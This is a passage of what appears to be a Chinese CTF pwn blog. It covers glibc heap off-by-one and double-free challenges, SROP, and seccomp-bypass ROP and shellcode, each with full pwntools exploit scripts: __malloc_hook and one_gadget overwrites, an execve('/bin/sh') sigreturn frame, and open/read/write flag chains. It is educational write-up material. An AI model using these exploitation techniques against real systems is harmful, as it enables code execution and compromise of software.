&#125;&#125; 重点抓edit函数和delete函数出来说 另外这题创建chunk用的是calloc函数 创建chunk的时候会清空chunk内容 使其为0 __int64 sub_E82()&#123; int v1; // [rsp+Ch] [rbp-14h] int v2; // [rsp+Ch] [rbp-14h] int v3; // [rsp+10h] [rbp-10h] unsigned int v4; // [rsp+14h] [rbp-Ch] printf(&quot;index: &quot;); v2 = recv_data(v1); v3 = v2; if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 15 ) &#123; v2 = *(&amp;chunk_judge + 4 * v2); if ( v2 == 1 ) &#123; printf(&quot;size: &quot;); v2 = recv_data(1); v4 = compare(*(&amp;chunk_size + 4 * v3), v2); if ( v2 &gt; 0 ) &#123; printf(&quot;content: &quot;); v2 = recv_data2(chunk_point[2 * v3], v4); &#125; &#125; &#125; return v2;&#125; 根据输入的index来索引bss段数组 如果该index有对应的chunk(即chunk_judge判断成功) 则输入size 在edit函数输入的size和create chunk时输入的size二者作为compare函数的参数 跟进看一下用来干什么 __int64 __fastcall sub_E26(int a1, unsigned int a2)&#123; __int64 result; // rax if ( a1 &gt; a2 ) return a2; if ( a2 - a1 == 10 ) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return result;&#125; 当edit_size-create_size&#x3D;10时 可以供我们多输入一个字节 那么利用四舍五入的机制 就可以做到溢出9个字节 delete函数: __int64 sub_F8E()&#123; int v0; // eax int v2; // [rsp+Ch] [rbp-14h] int v3; // [rsp+10h] [rbp-10h] __int64 v4; // [rsp+10h] [rbp-10h] printf(&quot;index: &quot;); v0 = recv_data(v3); v4 = v0; v2 = v0; if ( v0 &gt;= 0LL &amp;&amp; v0 &lt;= 15LL ) &#123; v4 = *(&amp;chunk_judge + 4 * v0); if ( v4 == 1 ) &#123; *(&amp;chunk_judge + 4 * v0) = 0; *(&amp;chunk_size + 4 * v0) = 0; free(chunk_point[2 * v0]); chunk_point[2 * v2] = 0LL; &#125; &#125; return v4;&#125; 指针置零了 不存在uaf漏洞 那么合计一下思路 可以利用覆写chunk size来合并chunk 从而获得free_chunk的指针 这样就可以泄露main_arena的真实地址 从而计算处真实地址 from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,28013)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu16_64.so&quot;)def add(size): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size))def edit(index,size,content): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr)) 这样我们获得了一个free chunk的指针 即chunk2 可以用其修改fd域 从而获得任意地址写的机会 因为libc版本是2.23 所以这里用malloc_hook_attack add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))payload = cyclic(0x13)+p64(onegadget_addr)edit(5,len(payload),payload)add(0x10)io.interactive() 按理来说这道题到这里就结束了 但是你会发现几个onegadget都不行 这是因为onegadget所要求的栈空间并不满足的问题 这时候两种办法 一种是hgame2023的一题中利用到的double free也能触发malloc_hook 详细解释和手法可以去看我对应的wp 还有一种办法是利用realloc来实现 下面详细介绍一下 realloc函数是用于重新分配之前被分配过的chunk空间 其也有realloc_hook 并且也类似于malloc_hook 如果不为0则调用 关键在于两点 一是realloc_hook和malloc_hook相邻 也意味着我们可以同时修改二者 第二点在于realloc调用的时候会进行大量的push操作 .text:00000000000846C0 public realloc.text:00000000000846C0 realloc proc near ; CODE XREF: _realloc↑j.text:00000000000846C0 ; DATA XREF: LOAD:0000000000006BA0↑o ....text:00000000000846C0.text:00000000000846C0 var_60 = qword ptr -60h.text:00000000000846C0 var_58 = byte ptr -58h.text:00000000000846C0 var_48 = byte ptr -48h.text:00000000000846C0.text:00000000000846C0 ; __unwind &#123;.text:00000000000846C0 push r15 ; Alternative name is &#x27;__libc_realloc&#x27;.text:00000000000846C2 push r14.text:00000000000846C4 push r13.text:00000000000846C6 push r12.text:00000000000846C8 mov r13, rsi.text:00000000000846CB push rbp.text:00000000000846CC push rbx.text:00000000000846CD mov rbx, rdi.text:00000000000846D0 sub rsp, 38h.text:00000000000846D4 mov rax, cs:__realloc_hook_ptr.text:00000000000846DB mov rax, [rax].text:00000000000846DE test rax, rax.text:00000000000846E1 jnz loc_848E8.text:00000000000846E7 test rsi, rsi.text:00000000000846EA jnz short loc_846F5.text:00000000000846EC test rdi, rdi.text:00000000000846EF jnz loc_84960 所以可以修改我们的栈空间 使其符合条件(如果可以的话) 我们先使用gdb动调看一下 onegadget的条件没有被满足时 对应的栈空间 调试exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25622)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size))def edit(index,size,content): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))payload = cyclic(0xb+0x8)+p64(onegadget_addr)edit(5,len(payload),payload)gdb.attach(io,&#x27;b *$rebase(0xccc)&#x27;)add(0x10) 此时断点打在calloc函数调用时 我们一步步s下去 此时进行了一个逻辑与操作 如果rax寄存器的值为0 那么逻辑与的结果为1 而jne指令当ZF零标志为0的时候 则会跳转 此时rax的值是一个地址 所以会执行jne跳转 我们继续跟进 此时call rax 再次跟进 这一步也就是onegadget判断栈结构的关键了 可以看到esp+0x30处并不等于NULL 所以onegadget执行失败 那么为什么我们改良后 通过realloc来调整栈结构的payload是 cyclic(0xb)+p64(onegadget_addr)+p64(realloc_addr+2) 我们来看看malloc_hook内存地址附近的情况 可以看到往低地址偏移0x8处是realloc_hook 这也就意味着如果我们按照上面的payload覆写 那么此时程序的执行流程为 因此凭借着readlloc在执行前会进行的push入栈操作 可以实现栈结构调节 不过由于本地和远程以及许多因素 建议还是直接试realloc_addr+x的偏移 完整exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25622)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size))def edit(index,size,content): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))gdb.attach(io)payload = cyclic(11)+p64(onegadget_addr)+p64(realloc_addr+2)edit(5,len(payload),payload)add(0x10)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"SROP","slug":"SROP","date":"2023-01-27T06:26:51.000Z","updated":"2023-09-14T17:20:46.000Z","comments":true,"path":"2023/01/27/SROP/","link":"","permalink":"http://example.com/2023/01/27/SROP/","excerpt":"","text":"一种独特的rop手法 利用了64位Linux的系统调用号15的rt_sigreturn函数 Linux系统中 信号实际上就是软中断 比如用户在终端输入了ctrl+c 就会终止终端 这时候就需要信号机制 软中断在计组原理中有所提及 这里不重复说明 每一个信号都有自己的名称和编号 对应着不同的功能 可以使用kill -l来查看 而今天要利用的rt_sigreturn函数就是linux中多种信号的一个 rt_sigreturn - 从信号处理函数返回，并清除栈帧 当linux内核确定某进程还有一个未阻塞的信号待处理 当进程下一次从内核态切换到用户态时（比如进行系统调用后 或者是进程重新调度到cpu上） 它会创建用户空间堆栈 或定义的备用堆栈上的一个栈帧 用于保存各种进程上下文 如图所示 其中最关键的就是寄存器的值也会保存在栈上 借助这一点 我们可以很轻易的实现寄存器值的修改 从而实现系统调用 这一段内存被称为Signal Frame 下面来看一道例题 buuctf中的ciscn_2019_es_7 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 保护机制很常规 看一下ida signed __int64 vuln()&#123; signed __int64 v0; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_read(0, buf, 0x400uLL); return sys_write(1u, buf, 0x30uLL);&#125; main函数跳转到了vuln函数 vuln函数有栈溢出的机会 同时还给了write函数输出0x30字节的数据 程序还给了gadget函数 伪代码看不出什么 看一下汇编 .text:00000000004004D6 public gadgets.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1 有mov rax，0xf 显然这题就是要利用rt_sigreturn进行srop来实现system系统调用 不过要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值binsh字符串的地址 由于题目没有自带binsh 此时有两种办法 一种是泄露libc基址 我们自己计算 还有一种是把binsh写到栈上 然后利用write函数泄露栈地址 gdb动调后发现泄露不到libc基址 所以这里用第二种办法 先gdb动调看一下哪里可以泄露栈地址 我们输入的8字节的字母a位于0x7fffffffdeb0处 而0x7fffffffded0处有一个0x7fffffffdfc8的栈地址可以泄露 我们可以计算偏移 得到栈上的地址 from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,27954)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;vuln_addr = 0x4004EDpayload = cyclic(0x10)#+p64(vuln_addr)gdb.attach(io)io.sendline(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x118 此时的stack_addr就是我们通过read函数输入的第一个字长的数据的地址 如果我们将其替换成binsh 那么就是binsh字符串的地址 接下来就是伪造Signal Frame了 pwntools自带了库可以实现 frame = SigreturnFrame()frame.rax = 59frame.rdi = stack_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addr 完整exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,27954)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;vuln_addr = 0x4004EDpayload = cyclic(0x10)+p64(vuln_addr)io.sendline(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x118syscall_addr = 0x400517rax15_addr = 0x4004DAframe = SigreturnFrame()frame.rax = 59frame.rdi = stack_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrpayload = b&#x27;/bin/sh\\x00&#x27;+cyclic(0x8)+p64(rax15_addr)+p64(syscall_addr)+bytes(frame)io.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"hgame2023","slug":"hgame2023","date":"2023-01-10T06:17:54.000Z","updated":"2023-09-14T17:19:12.000Z","comments":true,"path":"2023/01/10/hgame2023/","link":"","permalink":"http://example.com/2023/01/10/hgame2023/","excerpt":"","text":"orw以前没做过构造rop链的orw 记录一下 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/vuln&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 保护没啥值得留意的 直接ida打开看一下main函数 int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); sandbox(); puts(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;); vuln(); return 0;&#125; 开了沙盒 不出意外应该是禁用了execve 而system(“&#x2F;bin&#x2F;sh”)也是基于execve实现的 所以这里没有办法像以往一样简单的获取shell seccomp-tools dump .&#x2F;vuln 查看一下是否如同猜想的一样 当调用的函数为execve时进入0004 也就是return kill 禁止调用 那么跟进一下vuln函数 ssize_t vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF return read(0, buf, 0x130uLL);&#125; 可以进行一次栈溢出 但是溢出的字节数只有0x28（还有8字节要给ebp） 显然这点溢出长度只够我们泄露libc基址 但是由于被禁用了execve system和onegadget都用不了了 但是如果想用orw的话 很明显 read和open需要的溢出长度远超过0x28 溢出长度不够的情况一般两种解决办法 自己构造一次read 修改rdx的值 使得溢出长度足够 或者是构造一次read 往bss段写入rop链 随后栈迁移 但是总归都是要自己调用read 并且我们还需要pop rsi pop rdx的指令地址 但是由于大部分的题目是动态链接 很难找到单独的rsi和rdx 本题也是没有的 这个时候你要想起来 题目所给的libc文件也是可以用ROPgadget查找指令地址的 只不过使用其指令还需要我们泄露libc基址 那么初步的思路确定了 就可以开始第一步 先泄露基址 from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)rdi_addr = 0x401393rsi_r15_addr = 0x401391puts_got = elf.got[&#x27;puts&#x27;]puts_plt = 0x401070main_addr = 0x4012f0read_plt = 0x401080ret_addr = 0x40101abss_addr = 0x404090+0x50io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) 接下来是构造read read函数需要三个参数 rdi 控制第一个参数文件描述符 rsi控制写入地址 rdx控制写入字节数 但是很明显0x28的溢出长度是不够我们构造如此多的参数 那么我们可以gdb动调看一下 如果我们不对这三个寄存器动任何手脚 其分别值为多少 rdi满足条件 rdx为0x130 如果我们往bss段写入rop链的话 rdx也不用修改 那么只需要修改rsi就可以了 ROPgadget获取libc文件的pop rsi偏移 再加上libc基址获得pop rsi指令的地址 io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)io.sendline(payload) 这里注意一下bss_addr 要和bss段的起始位置间隔一段距离 因为bss段比较靠近got表 可能会导致栈空间延申到got表 导致read失败 也是老生常谈的问题了 那么接下里的难点就是构造rop链了 下面每行各自对应open write puts 应该是浅显易懂的 payload = b&#x27;./flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr) 完整exp: from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)#io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)rdi_addr = 0x401393rsi_r15_addr = 0x401391puts_got = elf.got[&#x27;puts&#x27;]puts_plt = 0x401070main_addr = 0x4012f0read_plt = 0x401080ret_addr = 0x40101abss_addr = 0x404090+0x50io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = puts_addr-libc.sym[&#x27;puts&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92puts_addr = libc_addr + libc.sym[&#x27;puts&#x27;]io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)io.sendline(payload)open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]payload = b&#x27;./flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr)io.sendline(payload)leave_addr = 0x4012beio.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x100)+p64(bss_addr)+p64(leave_addr)io.sendline(payload)io.recv()io.recv() simple_shellcode[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/vuln&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 保护全开 ida看一下main函数 int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL); puts(&quot;Please input your shellcode:&quot;); read(0, (void *)0xCAFE0000LL, 0x10uLL); sandbox(); MEMORY[0xCAFE0000](); return 0;&#125; mmap将0xcafe0000~0xcafe1000这块区域的权限设置为了可读可写可执行 并且程序的最后还调用了这块区域 明摆着是将shellcode写入到这块区域 同时给了一次写入的机会 但是只有10字节 但是这次又有sandbox函数 看一下是禁用了哪些函数 还是通过orw来读取flag吧 但是这次是采用shellcode的方式 首当其冲要解决的问题就是写入字节不够的问题 这0x10字节的长度虽然不够我们写orw 但是可以供我们调用read函数 但是如果我们想要全部参数都修改一次 也是会超出16字节的 所以还是和上题一样 动态调试看一下传完shellcode后各寄存器的默认值 我们只需要修改rsi rdi即可 rax为read的系统调用号0 不需要修改 shellcode = &#x27;&#x27;&#x27;mov esi ,0xcafe0500xor edi ,edisyscalljmp rsi&#x27;&#x27;&#x27; 这里注意一下地址 和bss段同理 栈有可能会溢出到其他不可执行的区域 所以需要抬高一点栈帧空间 随后就是orw的汇编: shellcode = f&quot;&quot;&quot;push 0x67616c66push (2)pop raxmov rdi, rspxor esi, esicdqsyscallmov r10d, 0x7fffffffmov rsi, raxpush (40)pop raxpush 1pop rdicdqsyscall&quot;&quot;&quot; 完整exp: from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31897)shellcode = &#x27;&#x27;&#x27;mov esi ,0xcafe0500xor edi ,edisyscalljmp rsi&#x27;&#x27;&#x27;io.sendline(asm(shellcode))shellcode = f&quot;&quot;&quot;push 0x67616c66push (2)pop raxmov rdi, rspxor esi, esicdqsyscallmov r10d, 0x7fffffffmov rsi, raxpush (40)pop raxpush 1pop rdicdqsyscall&quot;&quot;&quot;io.sendline(asm(shellcode))io.recv()io.recv() fast_note一道很常规的double free题 不过在最后修改malloc_hook的时候有点特殊 也算有学到新知识 这题是libc 2.23版本 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/vuln&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); init(argc, argv, envp); while ( 1 ) &#123; while ( 1 ) &#123; menu(); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 2 ) break; delete_note(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; show_note(&quot;%d&quot;, &amp;v3); &#125; else &#123; if ( v3 == 4 ) exit(0);LABEL_13: puts(&quot;Wrong choice!&quot;); &#125; &#125; else &#123; if ( v3 != 1 ) goto LABEL_13; add_note(); &#125; &#125;&#125; 没有edit函数 add函数的content输入没有堆溢出的机会 看一看delete函数 unsigned __int64 delete_note()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%u&quot;, &amp;v1); if ( v1 &lt;= 0xF ) &#123; if ( (&amp;notes)[v1] ) free((&amp;notes)[v1]); else puts(&quot;Page not found.&quot;); &#125; else &#123; puts(&quot;There are only 16 pages in this notebook.&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 堆块释放以后 没有对存放堆块的指针置零 存在UAF漏洞 再加上有show函数 那么泄露libc基址我们可以很轻松的通过unsortedbin来做到 from pwn import*#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)elf = ELF(&quot;./vuln&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = remote(&quot;week-2.hgame.lwsec.cn&quot;,31198)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x80,b&#x27;aaaa&#x27;)add(1,0x60,b&#x27;aaaa&#x27;)add(2,0x60,b&#x27;aaaa&#x27;)delete(0)show(0)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena - 88 - 0x3C4B20 应该是很好理解 fastbin的范围只有0x20~0x80 那么我们释放一个0x80大小的chunk就会被放入unsortedbin 这时候其fd和bk域就会指向main_arena_addr 而delete函数没有对这个chunk的指针置零 导致这个我们仍然可以使用这个指针对chunk进行操作 还有一点就是libc基址的计算办法 88这个gdb动调可以很明显的看出来 那这个0x3c4b20呢 以往我们用的是gdb动调看libc基址和当此程序运行时泄露的main_arean的偏移 但是有的时候题目远程靶机和本地的libc版本不一样 这个时候如果你不会用patchelf修改libc的话 可以通过ida打开题目所对应的libc文件 寻找malloc_trim函数 对应的这个dword_1ecb80的偏移就是main_arean相较于libc基址的偏移 接下来的任务是想办法获取shell 2.23的题目直接打malloc_hook就好了 如果没有开启FULL RELRO 的话还可以通过覆写got表来实现shell 这里我们采用打got表 用的是double free的办法 malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]delete(1)delete(2)delete(1)add(3,0x60,p64(malloc_hook-0x23))add(4,0x60,b&#x27;aaaa&#x27;)add(5,0x60,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xf03a4payload = cyclic(0x13)+p64(one_gadget)add(6,0x60,payload) 但是不管我们如果更换one_gadget的偏移 就是打不通 哪怕gdb动调已经可以看到malloc_hook已经被写入one_gadget了 这是因为one_gadget的调用条件不满足 那么常规的利用malloc函数触发malloc_hook肯定是不行的了 询问了其他师傅才知道 double free也能触发malloc_hook 为此也是十分好奇 去翻了翻double free的源码 if (SINGLE_THREAD_P) &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (&quot;double free or corruption (fasttop)&quot;); p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old); *fb = p; &#125; 当glibc检测到double free行为发生后 会调用malloc_printerr用来打印错误日志 但是基于本人水平也就只能朔源到这里了 以下均是猜想 因为malloc_printerr是在malloc.c中定义的 所以调用malloc_printerr就会和malloc函数一样先对malloc_hook的内容进行if判断 如果不为0则执行 完整exp: from pwn import*#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)elf = ELF(&quot;./vuln&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = remote(&quot;week-2.hgame.lwsec.cn&quot;,31198)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x80,b&#x27;aaaa&#x27;)add(1,0x60,b&#x27;aaaa&#x27;)add(2,0x60,b&#x27;aaaa&#x27;)delete(0)show(0)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena - 88 - 0x3C4B20malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]delete(1)delete(2)delete(1)add(3,0x60,p64(malloc_hook-0x23))add(4,0x60,b&#x27;aaaa&#x27;)add(5,0x60,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xf03a4payload = cyclic(0x13)+p64(one_gadget)add(6,0x60,payload)delete(3)delete(3)io.interactive() new_fast_note这题的主体结构和上题一致 不过版本从2.23到了2.31 这给我们的unsortedbin泄露机制和double free都制造了困难 由于多出了tcachebin 